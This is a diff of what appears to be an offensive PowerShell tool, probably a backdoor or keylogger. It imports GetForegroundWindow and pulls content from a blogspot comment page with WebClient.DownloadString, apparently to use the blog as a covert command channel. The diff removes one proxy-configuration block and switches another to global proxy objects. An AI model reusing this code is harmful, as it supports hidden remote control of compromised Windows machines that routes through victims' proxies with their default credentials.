@@ -822,18 +822,6 @@ public static extern IntPtr GetForegroundWindow();
              $word = 'comment-content'
             $WebClientObject = New-Object Net.WebClient
             
-            $ProxyCheck = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyEnable
-            
-                if ($ProxyCheck -eq 1) {
-                    Write-Verbose "Proxy configuration found, enabling proxy settings"
-                    [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
-                    $WebProxyObject.Address = $ProxyAddress
-                    $WebProxyObject.UseDefaultCredentials = $True
-                    $WebClientObject.Proxy = $WebProxyObject
-                }
-            
-            
-             
             $testo = "http://networksecuritytester.blogspot.it/2015/03/corso-cyberwar.html?showComment"
             Write-Verbose $testo
             $CommentResult = $WebClientObject.DownloadString($testo)
@@ -897,9 +885,9 @@ public static extern IntPtr GetForegroundWindow();
                 if ($ProxyCheck -eq 1) {
                     Write-Verbose "Proxy configuration found, enabling proxy settings"
                     [string] $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
-                    $WebProxyObject.Address = $ProxyAddress
-                    $WebProxyObject.UseDefaultCredentials = $True
-                    $WebClientObject.Proxy = $WebProxyObject
+                    $Global:WebProxyObject.Address = $ProxyAddress
+                    $Global:WebProxyObject.UseDefaultCredentials = $True
+                    $Global:WebClientObject.Proxy = $WebProxyObject
                 }
 
             #Pull the user agent string from the registry
